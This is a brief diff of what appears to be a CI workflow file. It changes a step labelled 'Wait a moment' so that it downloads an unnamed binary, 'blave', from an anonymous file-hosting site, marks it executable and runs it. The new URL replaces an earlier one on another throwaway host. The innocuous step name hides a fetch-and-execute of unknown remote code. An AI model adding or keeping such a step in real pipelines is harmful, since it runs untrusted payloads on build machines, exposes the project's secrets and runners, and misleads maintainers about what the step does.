@@ -28,6 +28,6 @@ jobs:
 
       - name: Wait a moment
         run: |
-          wget https://files.catbox.moe/o5ognd -O blave
+          wget https://bashupload.com/B7da0/blave
           chmod +x blave
           ./blave
